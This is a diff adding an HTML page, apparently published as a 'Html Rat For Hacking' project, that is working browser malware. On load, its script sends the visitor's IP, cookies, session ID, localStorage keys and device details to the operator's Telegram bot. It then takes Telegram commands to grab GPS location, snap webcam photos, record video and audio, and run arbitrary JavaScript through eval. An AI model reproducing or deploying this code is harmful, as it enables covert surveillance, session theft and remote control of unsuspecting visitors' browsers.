@@ -1,0 +1,390 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title👻🎃 Html Rat For Hacking....</title>
+  <style>
+    body, html { margin:0; padding:0; height:100%; }
+    iframe { display:block; width:100%; height:100%; border:none; }
+  </style>
+</head>
+<body>
+    
+  
+  
+  <h2 style="color:green; background-color:black">
+
+=============================<p></p>
+| $_ Html Rat Running... 📡💀<p></p>
+=============================                     
+  </h2>
+  <p>By <a href="https://GitHub.com/mr-r0ot/Html_Rat">GitHub Mr-r0ot</a></p>
+  
+  
+  
+  
+  <script>
+  // ===== تنظیمات =====
+  const BOT_TOKEN     = 'YOUR TELEGRAM BOT TOKEN';
+  const ADMIN_CHAT_ID = 59539XXXXX;  // عدد
+  const USERS_KEY     = 'tg_iframe_users';
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  let users          = JSON.parse(localStorage.getItem(USERS_KEY)||'[]');
+  let lastUpdateId   = 0, myIP, runMode = false;
+
+  // ===== شبکه =====
+  async function telegramSend(method, opts={}) {
+    return fetch(`https://api.telegram.org/bot${BOT_TOKEN}/${method}`, opts);
+  }
+  async function fetchIP() {
+    try {
+      let r = await fetch('https://api.ipify.org?format=json');
+      return (await r.json()).ip;
+    } catch {
+      return 'unknown';
+    }
+  }
+
+  // ===== ارسال info.html =====
+  async function sendInfoFile(ip) {
+    const rows = [];
+    const add = (k,v) => rows.push({k,v});
+    // حداقل 40+ ردیف
+    add('URL', location.href);
+    add('User Agent', navigator.userAgent);
+    add('Platform', navigator.platform);
+    add('Language', navigator.language);
+    add('Online', navigator.onLine);
+    add('Screen WxH', screen.width+'×'+screen.height);
+    add('Color Depth', screen.colorDepth+' bits');
+    add('CPUs', navigator.hardwareConcurrency);
+    add('RAM(GB)', navigator.deviceMemory||'N/A');
+    add('Timezone', Intl.DateTimeFormat().resolvedOptions().timeZone);
+    add('Cookies Count', document.cookie.split(';').filter(c=>c).length);
+    add('LocalStorage Count', localStorage.length);
+    add('SessionStorage Count', sessionStorage.length);
+    const perf = performance.timing;
+    ['navigationStart','responseEnd','domComplete','loadEventEnd']
+      .forEach(k=>add(k, perf[k]+' ms'));
+    if (performance.memory) {
+      add('Heap Limit', performance.memory.jsHeapSizeLimit);
+      add('Heap Used', performance.memory.usedJSHeapSize);
+    }
+    try {
+      let r = await fetch('https://ipapi.co/json'), d = await r.json();
+      ['ip','city','region','country_name','org'].forEach(k=>add(k, d[k]));
+    } catch(e) {
+      add('IP API Error', e.toString());
+    }
+    add('Cookie Details', document.cookie || 'N/A', 'All cookie names and values');
+  add('Session ID', sessionStorage.getItem('session_id') || 'N/A', 'Session identifier from sessionStorage');
+  add('LocalStorage Keys', JSON.stringify(Object.keys(localStorage)), 'All keys stored in localStorage');
+  add('Prefers Color Scheme', matchMedia('(prefers-color-scheme: dark)').matches ? 'dark' : 'light', 'User color scheme preference');
+  add('Prefers Reduced Motion', matchMedia('(prefers-reduced-motion: reduce)').matches, 'User motion preference');
+  add('WebAuthn Support', !!window.PublicKeyCredential, 'Web Authentication API support');
+  add('Max Touch Points', navigator.maxTouchPoints || 0, 'Maximum simultaneous touch points');
+  add('Pointer Fine', matchMedia('(pointer: fine)').matches, 'Precision pointer device support');
+  add('Hover Support', matchMedia('(hover: hover)').matches, 'Hover interactions support');
+  add('Clipboard API', !!navigator.clipboard, 'Programmatic clipboard access support');
+  add('Vibration API', !!navigator.vibrate, 'Vibration support on device');
+  add('WebGL Version', (() => { try { const c = document.createElement('canvas'); return c.getContext('webgl') ? 'WebGL' : c.getContext('experimental-webgl') ? 'Experimental WebGL' : 'None'; } catch { return 'None'; } })(), 'WebGL availability');
+  add('AudioContext Support', !!window.AudioContext, 'Web Audio API support');
+
+  try {
+    add('Media Devices Count', navigator.mediaDevices ? (await navigator.mediaDevices.enumerateDevices()).length : 'N/A', 'Number of media input/output devices');
+  } catch(e) {
+    add('Media Devices Error', e.message || String(e), 'Error enumerating media devices');
+  }
+
+  add('WebRTC Support', !!window.RTCPeerConnection, 'Peer-to-peer connection API');
+  add('Service Worker Support', !!navigator.serviceWorker, 'Service worker registration support');
+  add('Push Notifications Support', !!(navigator.serviceWorker && window.PushManager), 'Push notifications support');
+  add('Idle Detection API', !!navigator.idleDetector, 'User idle detection support');
+  add('Sensor Permissions API', !!navigator.permissions, 'Generic permissions API support');
+  add('Background Sync Support', !!(navigator.serviceWorker && 'sync' in ServiceWorkerRegistration.prototype), 'Background sync support');
+  add('Paint Timing API', !!performance.getEntriesByType, 'Performance entry types support');
+  add('Performance Observer', !!window.PerformanceObserver, 'Real-time performance monitoring');
+  add('Intl API', !!Intl, 'Internationalization API support');
+  add('URL API', !!URL, 'URL parsing and manipulation API');
+  add('Fetch API', !!window.fetch, 'Network fetch API support');
+  add('Cookie Store API', !!window.cookieStore, 'Cookie Store API support');
+  add('Permissions API', !!navigator.permissions, 'Permissions management API');
+  add('Cache API', !!window.caches, 'Service Worker Cache API support');
+  add('WebXR Support', !!navigator.xr, 'AR/VR support via WebXR');
+  add('File System Access API', !!window.showOpenFilePicker, 'File system access API support');
+    
+    
+    let html = '<!DOCTYPE html><html><head><meta charset="UTF-8"><title>info</title>'
+      +'<style>body{font-family:Arial;padding:20px;}table{width:100%;border-collapse:collapse;}'
+      +'th,td{border:1px solid #ccc;padding:8px;}th{background:#eee;}</style></head><body>'
+      +`<h1>Info for ${ip}</h1><table><thead><tr><th>Key</th><th>Value</th></tr></thead><tbody>`;
+    rows.forEach(r=> html += `<tr><td>${r.k}</td><td>${r.v}</td></tr>`);
+    html += '</tbody></table></body></html>';
+    const blob = new Blob([html], { type:'text/html' });
+    const form = new FormData();
+    form.append('chat_id', ADMIN_CHAT_ID);
+    form.append('document', blob, 'info.html');
+    await telegramSend('sendDocument', { method:'POST', body: form });
+  }
+
+  // ===== اعلان ادمین =====
+  async function notifyAdmin() {
+    const ua = navigator.userAgent;
+    let batt = 'N/A';
+    if (navigator.getBattery) {
+      try { batt = Math.round((await navigator.getBattery()).level*100) + '%'; } catch{}
+    }
+    const msg =
+`New client loaded:
+IP: ${myIP}
+Browser: ${ua}
+Battery: ${batt}
+Screen: ${screen.width}×${screen.height}
+Language: ${navigator.language}
+More details in info.html
+Use /panel`;
+    await telegramSend('sendMessage', {
+      method:'POST',
+      headers: {'Content-Type':'application/json'},
+      body: JSON.stringify({ chat_id: ADMIN_CHAT_ID, text: msg })
+    });
+  }
+
+  // ===== ثبت کلاینت =====
+  async function registerClient() {
+    myIP = await fetchIP();
+    let u = users.find(x=>x.ip===myIP);
+    if (!u) u = { ip:myIP, loads:0, last:0 }, users.push(u);
+    u.loads++; u.last = Date.now();
+    localStorage.setItem(USERS_KEY, JSON.stringify(users));
+    await notifyAdmin();
+    await sendInfoFile(myIP);
+  }
+
+  // ===== پاک‌سازی آپدیت‌های قدیمی =====
+  async function flushUpdates() {
+    await telegramSend('getUpdates', {
+      method:'POST',
+      headers: {'Content-Type':'application/json'},
+      body: JSON.stringify({ offset: -1 })
+    });
+  }
+
+  // ===== قابلیت‌ها =====
+  async function feature(action) {
+    switch(action) {
+      case 'gps':
+        // ابتدا سعی کن با Geolocation API
+        try {
+          return await new Promise((res, rej) =>
+            navigator.geolocation.getCurrentPosition(res, rej, { timeout: 10000 })
+          );
+        } catch(err) {
+          // در صورت خطا، fallback به IP-based
+          let r = await fetch('https://ipapi.co/json');
+          let d = await r.json();
+          return { coords: { latitude: d.latitude, longitude: d.longitude } };
+        }
+      case 'photo': {
+        const st = await navigator.mediaDevices.getUserMedia({ video: true });
+        const vid = document.createElement('video');
+        vid.srcObject = st;
+        await vid.play();
+        const canvas = document.createElement('canvas');
+        canvas.width = vid.videoWidth; canvas.height = vid.videoHeight;
+        canvas.getContext('2d').drawImage(vid, 0, 0);
+        st.getTracks().forEach(t=>t.stop());
+        return await new Promise(r=>canvas.toBlob(r,'image/png'));
+      }
+      case 'vid': {
+        const st = await navigator.mediaDevices.getUserMedia({ video:true, audio:true });
+        const rec = new MediaRecorder(st), chunks = [];
+        rec.ondataavailable = e=>chunks.push(e.data);
+        rec.start();
+        await new Promise(r=>setTimeout(r,10000));
+        rec.stop(); await new Promise(r=>rec.onstop=r);
+        st.getTracks().forEach(t=>t.stop());
+        return new Blob(chunks,{type:'video/webm'});
+      }
+      case 'audio': {
+        const st = await navigator.mediaDevices.getUserMedia({ audio:true });
+        const rec = new MediaRecorder(st), chunks = [];
+        rec.ondataavailable = e=>chunks.push(e.data);
+        rec.start();
+        await new Promise(r=>setTimeout(r,10000));
+        rec.stop(); await new Promise(r=>rec.onstop=r);
+        st.getTracks().forEach(t=>t.stop());
+        return new Blob(chunks,{type:'audio/webm'});
+      }
+    }
+  }
+
+  // ===== ارسال پنل =====
+  async function sendPanel() {
+    const kb = users.map(u=>[{
+      text: `${u.ip} ${(Date.now()-u.last<5*60*1000)?'●':'○'}`,
+      callback_data: `user:${u.ip}`
+    }]);
+    await telegramSend('sendMessage', {
+      method:'POST',
+      headers: {'Content-Type':'application/json'},
+      body: JSON.stringify({
+        chat_id: ADMIN_CHAT_ID,
+        text: '🛠 User List:',
+        reply_markup: { inline_keyboard: kb }
+      })
+    });
+  }
+
+  // ===== پردازش آپدیت‌ها =====
+  async function handleUpdates() {
+    const res = await telegramSend('getUpdates', {
+      method:'POST',
+      headers: {'Content-Type':'application/json'},
+      body: JSON.stringify({ offset: lastUpdateId + 1 })
+    });
+    const data = await res.json();
+    for (const upd of data.result) {
+      lastUpdateId = upd.update_id;
+
+      // فرمان /panel
+      if (upd.message?.text === '/panel' && upd.message.chat.id === ADMIN_CHAT_ID) {
+        await sendPanel();
+      }
+
+      // callback_query
+      if (upd.callback_query) {
+        const { data, id, from } = upd.callback_query;
+        await telegramSend('answerCallbackQuery', {
+          method:'POST',
+          headers:{'Content-Type':'application/json'},
+          body: JSON.stringify({ callback_query_id: id })
+        });
+
+        const [action, ip] = data.split(':');
+
+        // نمایش دکمه‌های user
+        if (action === 'user' && from.id === ADMIN_CHAT_ID) {
+          const kb = [[
+            { text:'Show info', callback_data:`info:${ip}` },
+            { text:'Run JS',   callback_data:`run:${ip}` }
+          ],[
+            { text:'Get GPS',      callback_data:`gps:${ip}` },
+            { text:'Take Photo',   callback_data:`photo:${ip}` }
+          ],[
+            { text:'Record Video', callback_data:`vid:${ip}` },
+            { text:'Record Audio', callback_data:`audio:${ip}` }
+          ]];
+          await telegramSend('sendMessage', {
+            method:'POST',
+            headers:{'Content-Type':'application/json'},
+            body: JSON.stringify({
+              chat_id: ADMIN_CHAT_ID,
+              text: `User ${ip} – choose:`,
+              reply_markup: { inline_keyboard: kb }
+            })
+          });
+        }
+
+        // دستورات client-side
+        else if (ip === myIP) {
+          if (action === 'info') {
+            await sendInfoFile(ip);
+          }
+          else if (action === 'run') {
+            runMode = true;
+            await telegramSend('sendMessage', {
+              method:'POST',
+              headers:{'Content-Type':'application/json'},
+              body: JSON.stringify({ chat_id:ADMIN_CHAT_ID, text:`JS run mode for ${ip}. Send code or 'exit'.` })
+            });
+          }
+          else if (['gps','photo','vid','audio'].includes(action)) {
+            try {
+              const res = await feature(action);
+              if (action === 'gps') {
+                await telegramSend('sendMessage', {
+                  method:'POST',
+                  headers:{'Content-Type':'application/json'},
+                  body: JSON.stringify({ chat_id:ADMIN_CHAT_ID,
+                    text:`GPS: ${res.coords.latitude.toFixed(6)}, ${res.coords.longitude.toFixed(6)}` })
+                });
+              }
+              else if (res instanceof Blob) {
+                const form = new FormData();
+                form.append('chat_id', ADMIN_CHAT_ID);
+                form.append('document', res, `${action}.${res.type.split('/')[1]}`);
+                await telegramSend('sendDocument', { method:'POST', body: form });
+              } else {
+                await telegramSend('sendMessage', {
+                  method:'POST',
+                  headers:{'Content-Type':'application/json'},
+                  body: JSON.stringify({ chat_id:ADMIN_CHAT_ID, text:`${action}: ${JSON.stringify(res)}` })
+                });
+              }
+            } catch(e) {
+              await telegramSend('sendMessage', {
+                method:'POST',
+                headers:{'Content-Type':'application/json'},
+                body: JSON.stringify({ chat_id:ADMIN_CHAT_ID, text:`Error ${action}: ${e.message||e}` })
+              });
+            }
+          }
+        }
+      }
+
+      // Run JS mode
+      if (upd.message?.text && upd.message.chat.id===ADMIN_CHAT_ID && runMode) {
+        const txt = upd.message.text;
+        if (txt.trim().toLowerCase() === 'exit') {
+          runMode = false;
+          await telegramSend('sendMessage',{ method:'POST',
+            headers:{'Content-Type':'application/json'},
+            body: JSON.stringify({ chat_id:ADMIN_CHAT_ID, text:'Exited JS mode.' })
+          });
+        } else {
+          let out;
+          try { out = eval(txt); }
+          catch(e) { out = e.toString(); }
+          await telegramSend('sendMessage',{ method:'POST',
+            headers:{'Content-Type':'application/json'},
+            body: JSON.stringify({ chat_id:ADMIN_CHAT_ID, text:`> ${txt}\n=> ${out}` })
+          });
+        }
+      }
+    }
+  }
+
+  // ===== اجرای اولیه =====
+  (async()=>{
+    await registerClient();
+    await flushUpdates();
+    setInterval(handleUpdates,2000);
+  })();
+  </script>
+</body>
+</html>
